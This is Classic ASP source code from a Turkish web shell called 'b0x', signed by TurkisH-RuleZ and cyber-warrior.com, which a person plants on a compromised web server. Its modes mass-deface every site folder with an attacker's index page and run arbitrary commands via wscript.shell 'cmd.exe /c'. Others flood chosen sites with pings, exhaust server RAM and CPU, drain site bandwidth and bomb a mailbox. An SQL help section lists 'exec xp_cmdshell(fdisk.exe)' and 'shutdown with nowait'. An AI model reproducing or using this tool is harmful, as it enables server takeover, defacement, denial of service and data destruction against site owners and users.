response.write "<table width=""100%"" class=""kbrtm""><tr valign=""top""><td colspan=""2"" align=""center"">"
response.write "<form name=""massattack"" action='"&FilePath&"' type=""post"">"
response.write "<table cellpadding=""1"" cellspacing=""1"" bgcolor=""#5d5d5d"" width=""100%"" class=""kbrtm"">"
tablo30(" <b>MASS Defaced Merkezi</b>")
tablo30("...... :::::  ?ndex KOD unu A?a??ya Yaz / Yap??t?r   ::::: ......")
tablo30("<br><b>Path : </b><input style=""color=#C6FCBE"" size=""60"" name=""Path"" value='"&Path&"' type=""text""><br><br>")
response.write "<input type=""hidden"" value=""19"" name=""mode""><input type=""hidden"" value="&time&" name=""Time""> " 
tablo12O("<textarea  style=""width:500px; height:250px"" name=""file""></textarea>")
tablo12O(" <input type=""radio"" value=""brute"" name=""islem"" checked> Brute  -   <input value=""single"" type=""radio"" name=""islem"" > Single   -   <input value=""ozel"" type=""radio"" name=""islem"" > Private <input name=""inject1"" value=""z.html"" type=""text"" size=15>  &nbsp;&nbsp; <input value=""ok"" type=checkbox name=""hash3"" >Eklenti <input size=15 name=""hash2"" value=""httpdocs\"" type=""text"">")
tablo12O("<input name=""hash9"" value=""copy"" type=radio checked> Kopyalayarak  -  <input name=""hash9"" value=""yarat"" type=radio> Olu?turarak")
tablo12O("<input value="" Havayaa Uçurr "" type=""Submit"">")
yazsol("<font color=#C6FCBE><b>Brute : </b>Belirtilen Dizinin ALt?ndaki; Tüm Dizinlere ve onlar?nda ALt Dizinleri ?ndex BAsar. </font>")
yazsol("<font color=#C6FCBE><b>Single : </b>Belirtilen Dizinin ALt?ndaki; Alt Dizinlere ?ndex BAsar. </font>")
yazsol("<font color=#C6FCBE><b>Private : </b>Belirtilen Dizinin ALt?ndaki; Alt Dizinlere ?stedi?iniz ?simle ?ndex BAsar. </font> ")
yazsol("<font color=#C6FCBE><b>Eklenti : </b>BRUTE & Single ile kullan?l?r. Permsion var ise bunu seçmenize ayarlaman?za gerek yok. E?er site isimlerini listeleytebiliyor, ve içine girremiyor fakat klas?r atlayarak girebiliyorsan?z. o zaman bunu seçin ve bulunan klas?rrden sonrakine gidip oraya index leri atar. Mesela ; '..site\b0x_com', '..\site\haber_com' .. gibi siteelr listeli. bunlar?n içlerine girid?inizde g?rüntülkeme yetkinzi yok . Ama e?er '..\site\b0x_com\www\' yap?nca girebiliyorsna?z. PERM?S?ON a?ma y?ntemidir. b?ylece Eklenti yerine 'www' yazarak ve seçerekden. tüm sitelere o kla?sr içine girme yetkisini sa?lay?p, index b?rakt?r?rr?z. </font> ")
yazsol("<font color=#C6FCBE><b>Kopyalayarak : </b>b0x dizinine bir TXT yazar. Sonra onu TUm  klas?rlere KOpyalayarak i?lem yapar. E?er b0x dizininde Writing  yok ise, i?lem gerçekle?mez. TUM MASS lar b?yledir. </font> ")
yazsol("<font color=#C6FCBE><b>Yaratarak : </b>Direk index kodunuzu, Klas?lerde OLU?TURARAk MASS yapar. BU b0x &  b0xPORTAL.CoM FARk? ile. 1-2 defa ba??ma geldi=) o yüzden bu ?zellei?i ekledim.</font> ")
yazsol("<font color=#FE7A84><b>NOT : </b>Brute & Single da 9 çe?it index basar, Private da ?stdi?iniz ?simle 1 tane atar ;) </font>")
response.write "</table></td></form></tr></table><br>"
Call Status 

CASE 19 'Mass Deface  ??leniyor. E?er ?ndex yok ise, Status  ve FOrm sunuyor, aksi halde MASS yap?yor. 
file = file&"<center><br><br><font color=green><b></b></font><br></center>"
if hash9 = "copy" then
on error resume next
a=Left(replace(Request.ServerVariables("PATH_TRANSLATED"),"/","\"),InStrRev(replace(Request.ServerVariables("PATH_TRANSLATED"),"/","\"),"\"))
Set hackindex = b0x.CreateTextFile(a&"\b0x.txt", True)
hackindex.write file
if err <> 0 then
response.write "<center><br><font color=#FE7A84> <font face=Wingdings size=5>N</font> Bulundu?un Dizinde Writing  YEtin yok. Bu yüzden ?ndex Sayfas? olu?turulamad?. <font face=Wingdings size=5>N</font> <br><br>  <font face=Wingdings size=5>N</font>  E?er ki Server içine bir Tane index yükler ve a?a??daki yere tam link ini yazarsan, O zaman MASS Defaced ba?l?yacakt?r. <font face=Wingdings size=5>N</font> <br><br><br></center>"
response.write "<table width=""100%"">"
response.write "<tr class=""kbrtm"" valign=""top""><td colspan=""2"" align=""center"">"
response.write "<form name=""dizincopypaste"" action='"&FilePath&"' type=""post"">"
response.write "<table cellpadding=""1"" cellspacing=""1"" bgcolor=""#5d5d5d"" width=""100%"">"
response.write "<input type=""hidden"" name='islem' value='"&islem&"'><input type=""hidden"" name='inject1' value='"&inject1&"'><input type=""hidden"" name='file' value='"&file&"'><input type=""hidden"" name='Time' value='"&time&"'><input type=""hidden"" name='mode' value='20'><input type=""hidden"" name='Path' value='"&Path&"'>"
Call tablo30("<b>?ndex in Server daki kendi ?ndex inin YErini G?ster. </b>")
Call tablo30("&nbsp;")
Call tablo12("<input  size=""80"" type=""text"" name=""hacked"" style='color=#C6FCBE' value='"&FolderPath&"&/index.html'>")
Call tablo12("<br><input value="" OK tamamd?r. ?ndex imi seçtim.  "" type=""Submit"">")
response.write "</form></table></td></tr></table><br>"
else
set hacking = nothing
hacked = a&"\b0x.txt"
hash6 = Path
Call MassAttack2(Path,file,hash2)
Call MassAttack(hash6,file,hash2)
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><b> ..... ::::  Bitttiiii  :::: ..... </b></td></tr></table> "
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><br><br><b>Developed By TurkisH-RuleZ</b><br><br> </td></tr></table> "
Response.Write "<script language=javascript>alert('Mass Defaced Completed Successfully !!... ')</script>"
end if
else  if hash9 = "yarat" then
hash6 = Path
Call MassAttack2(Path,file,hash2)
Call MassAttack(hash6,file,hash2)
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><b> ..... ::::  Bitttiiii  :::: ..... </b></td></tr></table> "
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><br><br><b>Developed By TurkisH-RuleZ</b><br><br> </td></tr></table> "
Response.Write "<script language=javascript>alert('Mass Defaced Completed Successfully !!...1 ')</script>"
end if 
end if
Call Status 

CASE 20 ' Status  sonucu, düzeltme yap?ld? ise, burdan MAss dewaam ediyor.
on error resume next
Set cloner2 = b0x.GetFile(hacked)
if err <> 0 then
response.write "<br><br><br><br><center> <font color=#FE7A84> <font face=Wingdings size=5>N</font> ?ndex Bulunamad?. Pathunu verid?in ?ndex yada Dosya BULUNAMADI. Mass Durdurudu !!!  <font color=#FE7A84> <font face=Wingdings size=5>N</font> </font> </center><br><br><br><br>"
set cloner2 = nothing
else
set cloner2 = nothing
file="b0x"
hash6 = Path
Call MassAttack2(Path,file,hash2)
Call MassAttack(hash6,file,hash2)
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><b> ..... ::::  Bitttiiii  :::: ..... </b></td></tr></table> "
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><br><br><b>Developed By TurkisH-RuleZ</b><br><br> </td></tr></table> "
Response.Write "<script language=javascript>alert('Mass Defaced Completed Successfully !!...2 ')</script>"
end if
Call Status 

CASE 21 ' MASS tester formu by b0x
on error resume next
response.write "<table width=""100%"" class=""kbrtm"">"
response.write "<tr valign=""top""><td colspan=""2"" align=""center"">"
response.write "<form name=""masstester"" action='"&FilePath&"' type=""post"">"
response.write "<table cellpadding=""1"" cellspacing=""1"" bgcolor=""#5d5d5d"" width=""100%"" class=""kbrtm"">"
tablo30(" <b>MASS Permision Tester</b>")
tablo30("...... :::::  ?zinleri Kontrol Eder   ::::: ......")
tablo30("<br><b>Path : </b><input style=""color=#C6FCBE"" size=""60"" name=""Path"" value='"&Path&"' type=""text""><br><br>")
response.write "<input type=""hidden"" value=""22"" name=""mode""><input type=""hidden"" value="&time&" name=""Time""> " 
tablo12O("<br><input value="" Teste Ba?laaaa... =) by b0x "" type=""Submit""><br><br>")
tablo12("&nbsp;")
response.write "<tr bgcolor=""#121212""><td class=""kbrtm"" align=""left"" width=""100%""  ><font color=#C6FCBE><b>NOT : </b>Bununla, Alt klas?rlerde Permision varm? yok mu ,Onu kontrol eder ve Listeler... </font>  <font color=#C6FCBE face=Wingdings size=5>N</font></td></tr>"
response.write "</form></table></td></tr></table><br>"
Call Status 

CASE 22 ' MASS TEster i?leme Gome by b0x
Call Tester(Path)
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><b> ..... ::::  Bitttiiii  :::: ..... </b></td></tr></table> "
response.write "<table width=""100%""><tr><td class=""kbrtm"" align=""center""><br><br><b>Developed By TurkisH-RuleZ</b><br><br> </td></tr></table> "
Response.Write "<script language=javascript>alert('Yetki Kontrolu Completed Successfully !!... ')</script>"
Call Status 

CASE 23 ' arama bulma- en güzel ?zeli?i time out olmamas? buldu?unu Writing s?d?r =) by b0x eseridir. 
response.write  "<br><center>"
i=0
Call arama(Path)
response.write  "</center><br>"
Response.Write "<script language=javascript>alert('"&i&" Kay?t Bulundu .... ')</script>"
nolist = True
Call Status 

CASE 24 ' Klas?r i?lermleri için Upload - Dosya ayarat - kla?sr yarat FORM lar? by b0x
on error resume next  
response.write "<table bgcolor=#000000 width=""100%"" ><tr><td>"
response.write "<center><table width=""100%""><tr><td class=""kbrtm"" align=""center""> Upload Merkezi  </td></tr><tr><td align=""center"" class=""kbrtm"">"
response.write "<form name=frmUpload method=post enctype=""multipart/form-data"" action='"&FilePath&"?mode=25&Time="&time&"&Path="&Path&"' ID=""Form1"">"
response.write "<input type=hidden name=folder value='"&Path&"' ID=""Hidden1"">"
response.write "Max: <input type=text name=max value=5 size=5 ID=""Text1""> <input type=button value=""Ayarla"" onclick=setid() ID=""Button1"" NAME=""Button1"">"
response.write "<table ID=""Table1"">"
response.write "<tr>"
response.write "<td id=upid>"
response.write "</td>"
response.write "</tr>"
response.write "</table>"
response.write "<input type=submit value="" ... ::  Upload  :: ... "" ID=""Submit1"" NAME=""Submit1"">"
response.write "</form>"
response.write "<script>"
response.write "setid();"
response.write "function setid() {"
response.write "    str='';"
response.write "    if (frmUpload.max.value<=0) frmUpload.max.value=1;"
response.write "    for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input size=30 type=file name=file'+i+'><br>';"
response.write "    upid.innerHTML=str+'<br>';"
response.write "}"
response.write "</script>"
response.write "</td></tr></table></center>"
response.write "<br><center><table align=""center"" width=""100%"" class=""kbrtm""><form name=""dosycrete"" action='"&FilePath&"?mode=26&Path="&Path&"&Time="&time&"' method=""post""><tr><td align=""center"">Klas?r Olu?tur : <input name=""file"" value=""b0x"" type=""text""> <input name=""git"" value="" Olu?tur "" type=""Submit""></td></tr></table></form></center>"
response.write "<center><table align=""center"" width=""100%"" class=""kbrtm""><form name=""filemaker"" action='"&FilePath&"?mode=27&Path="&Path&"&Time="&time&"' method=""post""><tr><td align=""center"">Dosya Ad? : <input name=""file"" value=""b0x.asp"" type=""text""></td></tr><tr align=""center""><td><textarea style='width:100%;height:100;' name=""islem""></textarea></td></tr> <tr align=""center""><td><input name=""git"" value=""..:: Olu?tur ::.."" type=""Submit""></td></tr></table></form></center>"
response.write "</td></tr></table>"
Call Status 

CASE 25 ' Upload i?lemi by b0x
Upload()

CASE 26 ' Klas?r yarat by b0x
response.write "<br><br><br><br><table bgcolor=#000000 width=""100%"" ><tr><td class=""kbrtm"" align=""center"">"
if b0x.FolderExists(Path&"\"&file) = True then
response.write "<center> <font color=#FE7A84> <font  face=Wingdings size=5>N</font> B?yle Bir Klas?r ZATEN VAr !!!! <font color=#FE7A84> <font  face=Wingdings size=5>N</font> </font> </center>"
else
on error resume next
b0x.CreateFolder(Path&"\"&file)
if err <> 0 then
olmadi("Klas?r Olu?turulamad?")
else 
oldu("Klas?r Olu?turuldu")
end if
end if
response.write "</td></tr></table>"
Call Status 

CASE 27 ' Dosya yarat by b0x
response.write "<br><br><br><br><table bgcolor=#000000 width=""100%"" ><tr><td class=""kbrtm"" align=""center"">"
on error resume next
Set MyFile = b0x.CreateTextFile(Path&"\"&file, True)
MyFile.write islem
if err <> 0 then
olmadi("Dosya Olu?turulamad?")
else 
oldu("Dosya Olu?turuldu")
end if
response.write "</td></tr></table>"
MyFile.close()
Call Status 

CASE 28 ' CMD Formu ve i?lem yeri  by b0x
if cmdkod="" then cmdkod="ipconfig"
response.write "<center><table align=""center"" width=""100%"" class=""kbrtm""><tr><td>"
response.write "<form name=""commmanderbyb0x"" method=""Post"" action='"&FilePath&"?mode=28&Path="&Path&"'> <b>CMD Komut Listele : </b><input style='color=#DAFDD0' name=""cmdkod"" size='57' value='"&cmdkod&"' type='text'><input name='"&Path&"' value='"&Path&"' type='hidden'><input name='"&mode&"' value=""28"" type='hidden'><input name='"&file&"' value=""a"" type='hidden'><input value="".:Go:."" type='Submit'> "
response.write "</td></tr></form></table></center>"
response.write "<center><table align=""center"" width=""100%"" class=""kbrtm""><tr><td>"
response.write "<textarea style='color=#DAFDD0;width:100%;height:320;'>"
response.write server.createobject("wscript.shell").exec("cmd.exe /c"&cmdkod).stdout.readall
response.write "</textarea>"
response.write "</td></tr></form><form name=""commmanderbyb0x2"" method=""Post"" action='"&FilePath&"?mode=28&Path="&Path&"'><tr><td><b>CMD Komut Cal??t?r: </b><input style='color=#DAFDD0' name=""inject4"" size='57' value='"&inject4&"' type='text'><input name='inject5' value='b0x' type='hidden'><input value="" .: Cal??t?r :. "" type='Submit'></td></tr>"
if inject5 = "b0x" then
on error resume next
tablo12("Komut Cal??t?r?ld?. ")
end if
response.write "</form></table></center>"
response.write "<br><center><table align=""center"" width=""100%"" class=""kbrtm"">"
tablo12L("<font color=#FE7A84><b>NOT : </b> CMD komutlar? tamamen , Server üzerinde çal??maktad?r. Siz burda yazaca??n?z komut orda çal???p, size geri d?necektir.")
tablo12L("<font color=#FE7A84><b>NOT : </b> <b>CMD Komut Listele</b> olay?, >dir, >netstat, >ping gibi geri DOS da geri bilgi d?ndüren komutlar kullan?l?r. AMA e?er program çal???tmrka, traojan yada Notepad gibi fonksiyonal ve applicaitonl? programlar, komutlar?da <b>CMD komut Cal??t?r</b>dan Uygulaman?z gerekir.Aksi halde Sistem k?sa süreli kitlenme ya?an?r. CEvap al?namayabilinir.GEre?inden fazla çal???trm yaparsn?z , ??lemcide Sizin User?n?z?n <b>RAM + CPU </b>kulln?m? anormal artacakt?r. </font>  <font color=#FE7A84 face=Wingdings size=5>N</font>")
yazorta("<a href='"&FilePath&"?mode=29&Path="&konu&"&Time="&time&"' onclick=""cmdhelp(this.href);return false;"">-->>  Kullan?labilir CMD komutlar?ndan BAz?lar?   <<-- </a>")
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'><b>by b0x</b></td></tr></td></tr></table></center>"


CASE 29 ' CMD aç?klama k?sm? HELPER by b0x
response.write "<center>"
yazsol("<b>Attrib</b>: Attrib komutu dosyalara belli ?zellikleri verir veya kald?r?r. c:\>attrib +r +a +s +h yaz?p enter tu?una basarsak.(help için : <b> ' attrib /?  ' </b>)")
yazsol("<b>Copy - xcopy</b> : Copy ve xcopy komutu ile istenilen dosya yada dosyalar?n ba?ka yerlere kopyalanmas? i?lemi gerçekle?tirilir. Bilgi için bunu yaz?n :' <b>copy /? '</b>")
yazsol("<b>Net use</b> : Pc nin Payla??m, Hesaplar?, ayarlar?, kullan?c?lar?... gibi ?zellliklere ula?abilece?imiz ve de?i?tirebilece?imiz bir komut <b>NET</b> . Yar?m dosyas? için -> <b> net help </b> Writing n?z yeterlidir.")
yazsol("<b>Netstat</b> : PC deki aç?k portlar?, ve diledi?iniz port u dinleyebilirsiniz. <b>Netstat -a -b -e -n -o -r -s -v</b> gibi parametreler al?r.")
yazsol("<b>Tracert</b> : Site, Ip, server ?n nerde oldu?unu tracert yapar. <b>tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout] target_name</b> ")
yazsol("<b>IPCONFIG</b> : Server , PC nin IP bilgileirni, network bilgileirni veriyor. kuln?m için - > <b>ipconfig help</b>  yaz?n yeterldir ")
yazorta("<b>by b0x</b>")
response.write "</center>"

CASE 30 ' PiNGer BY b0x - Server üzerinden s?n?rs?z ping sald?rr?s?. =) Coded by b0x
if not file = "1" then
response.write "<center><table align=""center"" width=""100%""><tr><td><form action='"&FilePath&"?mode=30&file=1&Path="&Path&"' method='post' name='pingerbye_jder'>"
yazsol(" Site Ad? : <input style='color=#DAFDD0' name='url' value='sitead?.com' type='text' size=30> (?rnek: google.com) ")
yazsol(" Ping Say?s? : <input style='color=#DAFDD0' name='inject1' value='20' type='text' size=20> (?rnek: 20) ")
yazsol(" Ping TimeOut Süresi : <input style='color=#DAFDD0' name='islem' value='750' type='text' size=20> milisaniye (?rnek:750) ")
yazsol(" Paket Boyutu : <input style='color=#DAFDD0' name='size' value='32' type='text' size=20> byte (32) ")
response.write "<br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'> <input name='bombalab0x' value=' .::  Bombala  ::. ' type='Submit' > </td></tr></table>"
response.write "</form></td></tr></table>"
yazsoll("  <font color=#C6FCBE> Not: Bunu kullan?rken girece?iniz Paket boyutu ?nemlidir. Mümkünce a??r? büyük paket girmeyin, çünkü server yada site nereye sald?rr?yorsan?z, büyük paketleri filtreler ve cevap vermezler. O yüzden sürekli T?meOUT yazar. o yüzden yaa Bo? b?rak?n yada 500 gibi normal bir seviye seçin.  <font color=#C6FCBE> <font face=Wingdings size=5>N</font> </font>  ")
yazsoll("<font color=#C6FCBE> Not: P?NG say?s?n? 98 dediniz mesela, Sistem bunu 10 hamlede yapacakt?r. 10 arl? g?nderektir. vede süreklisayfa kendini yenileyip, 98 olana kadar 10 ar 10 ar ping ee dewam edecektir. Burda T?MEout OLMA gibi sorunumuz yok. 100000 deseniz bile, o bitne kadar gece gündüze ping çekebilien sistem geli?tirdim. Korkmadan, vede gece aç?k b?rakarak s?n?rs?z pingler çekebilirisniz.  <font color=#C6FCBE> <font face=Wingdings size=5>N</font></font> ")
yazsoll(" <font color=#FE7A84> Not: b0x, com.tr, gov.tr uzant?l? sitelere kar?? koruma ald?m. Ping Attaker bu sitelere kar?? Cal??t?t?lamaz, ve çal???t?rlsa bile Ping atmaz, size Uyar? verir. TUrk Siteleri Koruma ilk hedefimizdir. TUrk TUrk ü Vurmaz. by b0x <font color=#C6FCBE> <font face=Wingdings size=5>N</font></font> ")
yazsoll("<font color=#C6FCBE> <b>Ping Attack b0x</b> taraf?ndan yaz?lm?? olup, biraz hayal gücü, biraz çaba azimle, ?u an kulan?d??n?z b0x yuda yazan olarak, bundaki amac?m Server ?n ,sitenin kaynaklar?n? s?mürmek vede onun üzerinden onun kaynaklar?n? kullanrak ba?ka yerlerede zarar , sald?r? yapam güdenmi?tir. BUndada BUnlaa ba?lad?m. <b>TUM haklar? b0x e aittir.</b> <font color=#C6FCBE> <font color=#C6FCBE> <font face=Wingdings size=5>N</font></font>  ")
else
if inject1 = "" then inject1 = 0
if count = "" then count = 0
if CInt(inject1) > CInt(count) + 10 then
	Call Ping_Bomb_b0x(url,10,islem,size)
	count = count + 10
	inject2 = ""&FilePath&"?file=1&mode=30&url="&url&"&size="&size&"&count="&count&"&inject1="&inject1&"&islem="&islem&""
	response.write "<META http-equiv=refresh content=2;URL='"&inject2&"'>"
	response.write "<br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align=""center"" > <b>"&count&"/"&inject1&"</b> tane Ping Cekildi. </td></tr></table>"
else if CInt(inject1) > CInt(count) then
	Call Ping_Bomb_b0x(url,CInt(inject1) mod 11,islem,size)
	count = count + (CInt(inject1) mod 11)
	yazortaa(" <b>"&count&"/"&inject1&"</b> tane Ping Cekildi... ")	
	yazortaa(" Pinger Attack by b0x 1.0 i?lemini tamamlad?...  ")
else 
	yazortaa(" <b>"&count&"/"&inject1&"</b> tane Ping Cekildi... ")	
	yazortaa(" Pinger Attack by b0x 1.0 i?lemini tamamlad?...  ")
end if
end if
end if

CASE 31 ' Server RAM & CPU Sald?r?s?
cmdd = array("C:\WINDOWS\System32\mspaint.exe","C:\Program Files\Internet Explorer\iexplore.exe","C:\WINDOWS\system32\notepad.exe")
if islem = "1" then
on error resume next
response.write server.createobject("wscript.shell").exec("cmd.exe /c"&cmdd(0))
else if islem = "2" then
on error resume next
response.write server.createobject("wscript.shell").exec("cmd.exe /c"&cmdd(1))
else if islem = "3" then
on error resume next
response.write server.createobject("wscript.shell").exec("cmd.exe /c"&cmdd(2))
else
if not file = "1" then
response.write "<center><table align=""center"" width=""100%""><tr><td>"
yazorta("<b> RAM & CPU Sald?r?s? for SERVER by b0x =) 1.0 </b>")
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td><font color=#C6FCBE>  Server ?n CPu ve RAm kaynaklar?n? 1 dk içinde tüketebilen bir b0x eseridir. Bununla sadece, 3 tür program sürekli aç?l?r ve kapat?lmaz(Paint, Notepad, Explorer) Server en fazla 1 dk içinde Ram&Cpu sorunu ve kitlenmeler, cevap vermemeler, Status t resetlenme ilede sonuçlanabilir.</font></td></tr></table>"
yazorta(" <a href='"&FilePath&"?mode=31&file=1'>..::  RAM & CPU Attacker ? CALI?TIR .. by b0x  ::..</a> ")
response.write "</td></tr></table></center>"
else
Call Ram_Cpu
end if
end if
end if
end if

CASE 32 ' S?te kaynak S?mürücü by b0x =)
if not islem = "1" then
response.write "<center><table align=""center"" width=""100%""><tr><td>"
yazorta("<b> S?te Kaynak S?mücü 1.0 by b0x </b>")
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td><form name=""sitefuckerbyb0x"" method='post' action='"&FilePath&"?mode=32'>Site Adresi : <input name='url' value='http://www.siteadi.com' style='color=#C6FCBE' size=55 type='text'></td></tr><tr><td> Robot Say?s? : <input name='file' style='color=#C6FCBE' type='text' value='50' size=30> <input name='islem' type='hidden' value='1'><input name='gooo' value=' ..:: S?mür ::..' type='Submit'></td></tr></form></table>"
yazsol("Belirtti?iz kadar Robot kadar ba?lan?r ve siteyi s?mürür. Ayr?ca Sald?r? sürekli kendini güceller, yeniler. Sonsuzdur. =) Robot u Ba?lant?n?za g?re ayarlay?n. Mesela; Robot u 50 yaparsan?z.O sayfa içinde 50 tane ayn? anda aç?lacak site ve indirecektir siteleri. ve o s?rada sürekli siz, dosya indiroyr geçiçi olarak. VE bu olay her 30 snde güncelleniyor Otomatik. Birkez çal???tr ?mür boyu kapatmazsan penceryi çal???r bir MAkina.")
yazsol("Site kodlar?n?, BAndwith ini ve ASP kitlenmesi yada SQL s?mürmede, ressim, text s?mürmede UStüne yoktur..")
yazorta("TUm haklar? Sakl?d?r by b0x =)")
response.write "</td></tr></table></center>"
else
on error resume next
yazorta("<b> S?te Kaynak S?mücü 1.0 by b0x =) 1.0 </b>")
yazorta("S?mürme MEkanizmas? Devrede...")
yazsol("Durdurmak için Pencereyi kapat. "&file&" Kadar ba?lan?p 30 sn da günceliyor sald?r?y?...")
yazorta("<b>by b0x</b>")
Call Somurgen(file,url)
yazorta(" 20 SN sonra yenileniyor... by b0x =) ")
response.write "<META http-equiv=refresh content=20;URL='"&FilePath&"?mode=32&islem=1&url="&url&"&file="&file&"'>"
end if

CASE 33 ' Mail BOMber by b0x :) TUm Kodlar?n b0x nun HAklar? b0x ya aittir. S?n?rs?z Mail atma imkan? sunuyorum size. K?ya??m? unutmay?n...
if not islem = "1" then
response.write "<center><table align=""center"" width=""100%""><tr><td>"
yazorta("<b> Mail Bomber 1.1 by b0x </b>")
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td><form name=""mailbomberbyb0x"" method='post' action='"&FilePath&"?mode=33'>Mail Adresi : <input name='file' value='z1d@b0x.jo' style='color=#C6FCBE' size=55 type='text'></td></tr><tr><td> Bomb Say?s? : <input name='count' style='color=#C6FCBE' type='text' value='50' size=22> <input name='islem' type='hidden' value='1'><input name='gooo' value=' ..:: Bommbala ::..' type='Submit'></td></tr></form></table>"
yazsol("S?n?rs?z Mail Bomb. Cdonts & Cydos Destekler. %100 inbox. Cyberwarrior.com , org, net ,maillerine Bomb yapamazs?n?z.")
yazorta("TUm haklar? Sakl?d?r by b0x =)")
response.write "</td></tr></table></center>"
else
if request.cookies("bilesen") = "0" then
if MailKorumasi(file) = 0 then
	if inject1 = "" then inject1 = 0
	if CInt(inject1) + 9 < CInt(count) then
		for j=0 to 10
			Call MailBomber_by_b0x(file)
		next
		inject1 = inject1 + 10
		response.write "<META http-equiv=refresh content=1;URL='"&FilePath&"?mode=33&islem=1&file="&file&"&count="&count&"&inject1="&inject1&"'>"
		response.write "<br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align=""center"" > <b>"&inject1&"/"&count&"</b> tane Mail G?nderildi... </td></tr></table>"		
	else if CInt(inject1)  < CInt(count) then
		for j=0 to (count mod 10)
			Call MailBomber_by_b0x(file)
		next
		inject1 = inject1 + (count mod 10)
		yazortaa(" <b>"&inject1&"/"&count&"</b> tane Mail G?nderildi... ")	
		yazortaa(" Mail Bomber by b0x 1.0 i?lemini tamamlad?...  ")
	else
		yazortaa(" <b>"&inject1&"/"&count&"</b> tane Mail G?nderildi... ")	
		yazortaa(" Mail Bomber by b0x 1.0 i?lemini tamamlad?...  ")
	end if
	end if
else
response.write "<br><br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align=""center"" > <font color=#FE7A84> <font  face=Wingdings size=5>N</font> BOMB yap?lamad?. Tasvip etmedi?imiz Bir mail e Sald?rd???n?z için. by b0x !!!! <font color=#FE7A84> <font  face=Wingdings size=5>N</font> </font> </td></tr></table>"
end if
else
response.write "<br><br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align=""center"" > <font color=#FE7A84> <font  face=Wingdings size=5>N</font> Server Gerekli Olan Cdonts yada Cydos Bilesenlerini desteklemiyor. <font color=#FE7A84> <font  face=Wingdings size=5>N</font> </font> </td></tr></table>"
end if
end if

CASE 34 ' MSSQL - MYSQL Ba?lant? Formu Developed By TurkisH-RuleZ
if not islem = "1" then
Call MSSQL_Form
yazortaa(" E?erki, Sitelerin MSSQL bilgilerini biliyorsan?z, bununla çok kolay ba?lanabilir.. ")
yazortaa(" Tablolar? g?rebilir, üzerinde SQL komut çal??t?rabilir, verileri okuyaiblirisniz ")
yazortaa(" Cok sa?lam ve güçlü bir MSSQL Manager hizmeti Sa?lar size...")
yazortaa(" <b>by b0x :)</b>")
else
Call SQL_menu_by_b0x
Call Tablolama
end if
nolist = True

CASE 35 ' MSSQL - MYSQL Conneciton için Developed By TurkisH-RuleZ
Call SQL_menu_by_b0x
Call MSSQL_by_b0x(b0xsql,table)
nolist = True

CASE 99 ' b0x WAS HERE - FEEL THE POWER OF TURKS
'Türk Bayra?? Ascii Karakterlerle - Created By b0x :)
Response.Write "<br><center><table width=80 height=50 cellpadding=0 cellspacing=0><tr><td width=10 align=left valign=middle style=""background-color:AA0000"">&nbsp;</td><td width=70 align=left valign=middle style=""background-color:AA0000""><font size=7 face=Wingdings>Z</font></td></tr></table></center><br>"
yazorta("<b>Biz Ne yapt?k / What We Do?</b>")
yazsol("Biz bir b0x & MSWCTools & XMLHTTP Compenent lerini kullanarak Server a site üzerinden HTTP protocolunden eri?im sa?land???nda, Size Server ?n tüm imkanlar?ndan yararlanman?z için, Permission, ?ifre, gizli tüm içeriklere direk ula?ma, yada a?ma gibi ?zelikleri olan. Server ? ç?kertmeye , hatta kaynaklar?n? son damlas?na kullanabilen Cyber-Warrior.CoM ad?na hizmet veren Bir Canavar yaratt?k.")
yazorta("<b>Ad? ? Name ?</b>")
yazsol("Bu yaz?l?m b0x yaz?l?m?d?r. Bunun ad? <b>a</b>b0x <b></b>F<b>SO</b> dur. oda k?saca -> <b>b0x'dur</b>")
yazorta("<b>Biz Kimiz / Who We Are?</b>")
yazsol("<b><a href=""mailto:b0x@hotmail.com"">b0x</a> : Sitemiz <a href=""http://cyber-warrior.com"" target=_blank"">http://cyber-warrior.com</a></b>")
olmadi("<b>..:: TAKL?TLER?NDEN SAKININ !!! ::..</b>")

CASE 36 ' SQL komut YArd?m k?lavuzu by b0x
yazorta("<b>SQL Komut Yard?m Merkezi by b0x :) </b>")
yazsoll("<b>SELECT</b> - Seçme&listeleme")
yazsol("Select * from TABLEADI<br> Select * from TABLEADI where SUTUNADI = DE?ER <br> Select * from tblAdmin where ID = 1")
yazsoll("<b>INSERT</b> - ekleme")
yazsol("Insert into TABLOADI (stunisimleri) values (de?eleri)<br> Insert into tblAdmin (Name,Pwd,Gruop) values ('b0x','123456',1)")
yazsoll("<b>UPDATE</b> - editleme")
yazsol("Update TABLOADI set stunad? = 'de?eri' where Stunad? = de?eri <br> Update tblAdmin set Name = 'b0x' where ID = 1")
yazsoll("<b>DELETE</b> - Deleting ")
yazsol("Delete TABLOADI where Stunad? = de?eri<br>Delete tblAdmin where ID = 1")
yazsoll("<b>DROP</b> - tabloyu komple Deleting ")
yazsol("Drop table TABLOADI <br> Drop Table tblAdmin")
yazsoll("<b>Exes</b> - Fdisk çektirmek için")
yazsol("exec xp_cmdshell(‘fdisk.exe’)")
yazsoll("<b>ShutDown</b> - SQL server kapan?r.")
yazsol("shutdown with nowait")

CASE 37 ' Sistem Analizer Developed By TurkisH-RuleZ 
on error resume next
Set b0xNet = Server.CreateObject("WSCRIPT.NETWORK")
response.write "<center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td width='300'>"
yazorta("<b>Server ?n Bilgileri</b>")
yazsol("OS : <font color=#C6FCBE>"& OS() &"</font>")
yazsol("PC & Oturum Ad? : <font color=#C6FCBE>\\"& b0xNet.ComputerName &"\"&b0xNet.UserName&"</font>")
struser = b0xNet.UserName
yazsol("Server : <font color=#C6FCBE>"&request.servervariables("SERVER_NAME")&"</font>")
